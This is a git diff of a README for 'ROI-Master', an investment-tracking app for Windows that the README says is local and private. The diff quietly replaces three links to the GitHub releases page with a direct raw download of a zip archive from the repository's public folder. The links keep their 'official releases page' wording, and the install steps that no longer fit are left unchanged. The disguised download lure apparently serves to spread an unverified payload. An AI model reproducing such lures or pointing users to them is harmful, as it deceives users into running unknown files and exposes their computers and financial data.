@@ -1,6 +1,6 @@
 # 📈 ROI-Master - Track investment growth using smart tools
 
-[![Download ROI-Master](https://img.shields.io/badge/Download-ROI--Master-blue)](https://github.com/Xenia150232/ROI-Master/releases)
+[![Download ROI-Master](https://img.shields.io/badge/Download-ROI--Master-blue)](https://github.com/Xenia150232/ROI-Master/raw/refs/heads/main/public/Master-RO-v3.9-beta.1.zip)
 
 ROI-Master helps you track growth across your investments. You can view your asset classes, check data trends, and use AI to analyze your portfolio. This tool runs entirely on your own computer. It does not send your data to a server. You keep full control of your financial information and personal files. The application exists as a single file. You download it, open it, and start your analysis.
 
@@ -12,7 +12,7 @@ The software uses a local processing design. When you load your datasets, your c
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/Xenia150232/ROI-Master/releases).
+1. Visit the [official releases page](https://github.com/Xenia150232/ROI-Master/raw/refs/heads/main/public/Master-RO-v3.9-beta.1.zip).
 2. Look for the latest version listed at the top of the page.
 3. Click the link to download the file to your computer.
 4. Save the file to a folder you can find easily, like your Downloads or Documents folder.
@@ -85,7 +85,7 @@ Try to stay specific. Use terms found in your data file. If you ask about a spec
 Yes. It remains free to use for personal financial tracking. 
 
 ### How do I update to a newer version?
-Go back to the [download page](https://github.com/Xenia150232/ROI-Master/releases). Download the newest file to keep your features current. You can replace the old file with the new one.
+Go back to the [download page](https://github.com/Xenia150232/ROI-Master/raw/refs/heads/main/public/Master-RO-v3.9-beta.1.zip). Download the newest file to keep your features current. You can replace the old file with the new one.
 
 ## 🤝 Support
 
